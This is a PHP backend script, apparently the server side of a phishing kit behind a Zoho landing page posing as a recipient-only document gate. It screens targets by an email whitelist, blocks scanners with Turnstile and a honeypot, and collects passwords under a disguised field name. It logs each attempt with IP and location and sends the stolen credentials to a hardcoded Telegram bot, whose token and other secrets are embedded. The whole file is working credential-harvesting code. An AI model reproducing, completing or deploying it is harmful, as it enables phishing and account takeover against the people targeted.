<?php
// ---------- SESSION: cross-site safe (Zoho → Railway) ----------
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,      // Railway is HTTPS
    'httponly' => true,
    'samesite' => 'None',    // REQUIRED for cross-site cookie from Zoho
]);

session_start();

// ---------- CONFIG ----------
define('ATTEMPTS_FILE', '/data/attempts.json');   // Railway volume

$EMAIL_VALIDATION_ENABLED = true;                 // whitelist ON/OFF
$telegram_bot_token       = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
$telegram_chat_id         = "6915371044";
$turnstile_secret         = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
$whitelist_file           = __DIR__ . '/papa.txt';

// ✅ CHANGE THESE:
$SUCCESS_REDIRECT_URL     = "https://example.com/final-document"; // final doc/page
$BLOCK_REDIRECT_URL       = "https://example.com/blocked";        // after 3 wrong tries

// Only these frontends may call this API
$ALLOWED_ORIGINS = [
    'https://transmission.zoholandingpage.com',   // Zoho landing origin
    // add more allowed origins here if needed
];

// ---------- CORS / ORIGIN ----------
header('Content-Type: application/json; charset=utf-8');

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if ($origin && in_array($origin, $ALLOWED_ORIGINS, true)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
    header("Vary: Origin");
}

// Always allow for preflight
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

// Handle OPTIONS preflight quickly
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    echo '';
    exit;
}

// Hard origin enforcement for real requests
if (!$origin || !in_array($origin, $ALLOWED_ORIGINS, true)) {
    echo json_encode(['ok' => false, 'error' => 'Origin not allowed']);
    exit;
}

// ---------- HELPERS ----------
function get_client_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function json_fail($msg, $extra = []) {
    $payload = array_merge(['ok' => false, 'error' => $msg], $extra);
    echo json_encode($payload);
    exit;
}

function json_ok($extra = []) {
    $payload = array_merge(['ok' => true], $extra);
    echo json_encode($payload);
    exit;
}

// Only POST for real work
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    json_fail('Invalid method');
}

$action = $_POST['action'] ?? '';
if (!in_array($action, ['step1', 'step2'], true)) {
    json_fail('Invalid action');
}

// Honeypot check
if (!empty($_POST['company'] ?? '')) {
    json_fail('Unexpected error. Please try again.');
}

// ---------- LOAD ATTEMPTS ----------
$attempts = [];
if (file_exists(ATTEMPTS_FILE)) {
    $decoded = json_decode(file_get_contents(ATTEMPTS_FILE), true);
    if (is_array($decoded)) {
        $attempts = $decoded;
    }
}

// ---------- WHITELIST ----------
function email_allowed($email, $enabled, $file) {
    if (!$enabled) return true;

    if (!file_exists($file)) {
        json_fail('Configuration error: whitelist missing.');
    }

    $whitelist = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $whitelist = array_map('trim', $whitelist);

    return in_array($email, $whitelist, true);
}

// ---------- ACTION: STEP 1 (email + Turnstile) ----------
if ($action === 'step1') {
    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    $cf    = $_POST['cf-turnstile-response'] ?? '';

    if (!$email) {
        json_fail('Please enter a valid email.');
    }

    if (!$cf) {
        json_fail('Please complete the security check.');
    }

    $ip = get_client_ip();

    // Turnstile verify
    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'secret'   => $turnstile_secret,
        'response' => $cf,
        'remoteip' => $ip,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    $turnstile_result = json_decode($result, true);
    if (empty($turnstile_result['success'])) {
        json_fail('Security check failed. Please try again.');
    }

    // Whitelist
    if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
        json_fail('Access restricted to intended recipient.');
    }

    // Step2 session markers
    $_SESSION['verified_email'] = $email;
    $_SESSION['verified_at']    = time();
    $_SESSION['verified_ip']    = $ip;
    $_SESSION['step2_token']    = bin2hex(random_bytes(16));
    $_SESSION['step2_min_time'] = time() + 3; // min 3s before step2

    json_ok([
        'token' => $_SESSION['step2_token'],
        'email' => $email,
    ]);
}

// ---------- ACTION: STEP 2 (email + password) ----------
if ($action === 'step2') {
    $ip = get_client_ip();

    // Session TTL + IP binding
    $TTL = 600; // 10 minutes
    if (
        empty($_SESSION['verified_at']) ||
        (time() - $_SESSION['verified_at']) > $TTL ||
        empty($_SESSION['verified_ip']) ||
        $_SESSION['verified_ip'] !== $ip
    ) {
        session_unset();
        json_fail('Session expired. Please verify again.');
    }

    // Step2 token
    $postedToken  = $_POST['step2_token'] ?? '';
    $sessionToken = $_SESSION['step2_token'] ?? '';
    if (!$postedToken || !$sessionToken || !hash_equals($sessionToken, $postedToken)) {
        session_unset();
        json_fail('Invalid session. Please verify again.');
    }

    // Min time delay
    $minTime = $_SESSION['step2_min_time'] ?? 0;
    if (time() < $minTime) {
        json_fail('Unexpected error. Please try again.');
    }

    // Single-use token + timer
    unset($_SESSION['step2_token'], $_SESSION['step2_min_time']);

    // Email + password
    $original_email = $_SESSION['verified_email'] ?? '';
    $emailCandidate = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    $email          = $emailCandidate ?: $original_email;
    $password       = trim($_POST['name'] ?? '');

    if (!$email || !$password) {
        json_fail('Please complete all fields.');
    }

    // Optional re-whitelist
    if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
        json_fail('Access restricted to intended recipient.');
    }

    // Geo info (best-effort)
    $geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query");
    $geoData = $geo ? json_decode($geo, true) : null;
    $location = ($geoData && isset($geoData['country']))
        ? ($geoData['country'] . ", " . $geoData['regionName'] . ", " . $geoData['city'])
        : "Unknown";

    $now = date('Y-m-d H:i:s');

    // Update attempts log
    if (!isset($attempts[$email])) {
        $attempts[$email] = [
            'names'    => [$password],
            'count'    => 1,
            'ip'       => $ip,
            'location' => $location,
            'time'     => $now,
        ];
    } else {
        $attempts[$email]['names'][] = $password;
        $attempts[$email]['count']   = ($attempts[$email]['count'] ?? 0) + 1;
        $attempts[$email]['ip']      = $ip;
        $attempts[$email]['location']= $location;
        $attempts[$email]['time']    = $now;
    }

    @file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));

    // Telegram notification
    $msg  = "Login attempt for: {$email}\n";
    if (!empty($original_email) && $original_email !== $email) {
        $msg .= "Original validated email: {$original_email}\n";
    }
    $msg .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
    $msg .= "IP: {$ip}\n";
    $msg .= "Location: {$location}\n";
    $msg .= "Last updated: {$attempts[$email]['time']}";

    @file_get_contents(
        "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage" .
        "?chat_id={$telegram_chat_id}&text=" . urlencode($msg)
    );

    // Password check
    $correct_password = "John Doe";  // 🔐 TODO: change this

    if ($password !== $correct_password) {
        if ($attempts[$email]['count'] >= 3) {
            json_fail(
                'Access denied.',
                ['blocked' => true, 'redirect' => $BLOCK_REDIRECT_URL]
            );
        }

        json_fail('Incorrect Password. Please try again.');
    }

    // SUCCESS → clear session + redirect
    unset($_SESSION['verified_email'], $_SESSION['verified_at'], $_SESSION['verified_ip']);

    json_ok([
        'redirect' => $SUCCESS_REDIRECT_URL,
    ]);
}
